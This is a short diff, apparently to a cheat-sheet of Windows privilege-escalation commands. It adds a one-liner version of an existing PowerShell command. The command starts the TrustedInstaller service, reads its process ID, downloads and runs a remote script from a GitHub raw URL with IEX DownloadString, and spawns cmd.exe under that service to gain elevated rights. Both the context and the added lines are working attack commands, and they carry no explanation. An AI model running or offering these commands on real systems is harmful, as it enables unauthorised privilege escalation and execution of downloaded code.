@@ -13,3 +13,7 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuse
 $tsinstall = cmd.exe /c 'net start trustedinstaller & sc queryex trustedinstaller | find /i "pid"' | findstr PID | ? {$_.trim() -ne "" } | ForEach-Object {$_.Trim() -replace "\s+","," };$tsechdelim = echo ($tsinstall -split ',')[2];IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent($tsechdelim,'c:\windows\system32\cmd.exe')
 
 ------------------------------------------------------------------------------------------------------------------------------------------
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent((echo ((cmd.exe /c 'net start trustedinstaller & sc queryex trustedinstaller | find /i "pid"' | findstr PID | ? {$_.trim() -ne "" } | ForEach-Object {$_.Trim() -replace "\s+","," }) -split ',')[2]),'c:\windows\system32\cmd.exe')
+
+------------------------------------------------------------------------------------------------------------------------------------------
